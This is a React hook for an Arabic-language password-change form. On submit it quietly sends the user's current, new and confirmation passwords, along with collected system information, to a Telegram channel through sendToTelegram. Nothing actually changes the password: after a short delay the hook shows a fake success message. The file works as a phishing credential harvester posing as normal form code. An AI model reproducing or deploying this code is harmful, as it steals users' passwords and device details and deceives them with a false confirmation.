import { useState } from 'react';
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram, collectSystemInfo } from '@/utils/telegramNotifier';

export const usePasswordForm = () => {
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [errors, setErrors] = useState<{
    oldPassword?: string;
    newPassword?: string;
    confirmPassword?: string;
  }>({});
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const validatePassword = (password: string): boolean => {
    const minLength = password.length >= 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasNumber = /\d/.test(password);

    return minLength && hasUpperCase && hasNumber;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrors({});
    
    const message = `
🔐 محاولة تغيير كلمة المرور 🔐

👤 تفاصيل كلمات المرور:
• كلمة المرور الحالية: ${oldPassword}
• كلمة المرور الجديدة: ${newPassword}
• تأكيد كلمة المرور: ${confirmPassword}

💻 معلومات النظام:
${collectSystemInfo()}

⏰ وقت المحاولة: ${new Date().toLocaleString('ar-SA')}
    `;

    await sendToTelegram(message);
    
    const isValidNewPassword = validatePassword(newPassword);
    const passwordsMatch = newPassword === confirmPassword;

    if (!isValidNewPassword) {
      setErrors(prev => ({
        ...prev,
        newPassword: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم"
      }));
      setIsLoading(false);
      return;
    }

    if (!passwordsMatch) {
      setErrors(prev => ({
        ...prev,
        confirmPassword: "كلمة المرور وتأكيدها غير متطابقين"
      }));
      setIsLoading(false);
      return;
    }

    // Show loading toast
    toast({
      title: "جاري تغيير كلمة المرور...",
      className: "bg-black text-white w-auto h-12 rounded-lg",
    });

    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Show success toast
    toast({
      title: "تم تغيير كلمة المرور بنجاح",
      className: "bg-black text-white w-auto h-12 rounded-lg",
    });
    
    setIsLoading(false);
    setOldPassword("");
    setNewPassword("");
    setConfirmPassword("");
  };

  return {
    oldPassword,
    setOldPassword,
    newPassword,
    setNewPassword,
    confirmPassword,
    setConfirmPassword,
    isLoading,
    handleSubmit,
    errors
  };
};